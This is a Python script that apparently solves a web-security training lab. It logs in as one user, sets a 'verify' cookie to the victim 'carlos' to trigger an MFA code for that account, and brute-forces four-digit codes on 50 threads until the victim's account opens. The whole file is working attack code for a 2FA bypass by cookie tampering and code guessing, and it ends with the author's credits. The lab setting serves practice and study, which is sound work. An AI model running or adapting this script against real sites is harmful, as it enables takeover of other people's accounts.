import requests
from colorama import Fore, Style, init
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        init()
        self.my_username = 'wiener'
        self.my_password = 'peter'
        self.victim_username = 'carlos'
        self.found = threading.Event()
        self.lock = threading.Lock()

    def sign_in_as_wiener(self):
        data = {
            'username': self.my_username,
            'password': self.my_password
        }
        self.session.post(self.lab_url + 'login', data=data)

    def generate_mfa_code_for_carlos(self):
        self.session.cookies.set('verify', 'carlos')
        self.session.get(self.lab_url + 'login2')
        print(self.session.cookies.items())

    def brute_force_mfa_code(self, mfa_code):
        if self.found.is_set():
            return
        data = {
            'mfa-code': mfa_code
        }
        response = self.session.post(self.lab_url + 'login2', data=data)
        with self.lock:
            if self.found.is_set():
                return
            if 'Your username is' in response.text:
                print(Fore.GREEN + f'[+] {mfa_code}' + Style.RESET_ALL)
                self.found.set()
            else:
                print(Fore.RED + f'[-] {mfa_code}' + Style.RESET_ALL)

    def brute_force_mfa_codes(self):
        mfa_codes = [f'{i:04}' for i in range(2000)]
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(self.brute_force_mfa_code, mfa_code) for mfa_code in mfa_codes]
            for _ in as_completed(futures):
                if self.found.is_set():
                    break

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.sign_in_as_wiener()
        self.generate_mfa_code_for_carlos()
        self.brute_force_mfa_codes()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
